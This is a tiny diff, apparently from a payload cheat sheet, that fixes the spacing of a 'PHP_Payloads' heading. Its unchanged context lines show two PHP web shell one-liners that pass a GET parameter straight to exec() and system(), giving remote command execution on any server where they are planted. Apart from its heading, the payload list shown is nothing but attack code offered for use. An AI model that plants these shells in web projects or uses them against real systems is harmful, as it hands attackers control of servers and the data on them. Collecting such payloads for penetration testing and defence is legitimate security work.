@@ -1,4 +1,4 @@
-##PHP_Payloads
+## PHP_Payloads
 
     <?php exec($_GET['cmd']); ?>
     <?php system($_GET['cmd']); ?>
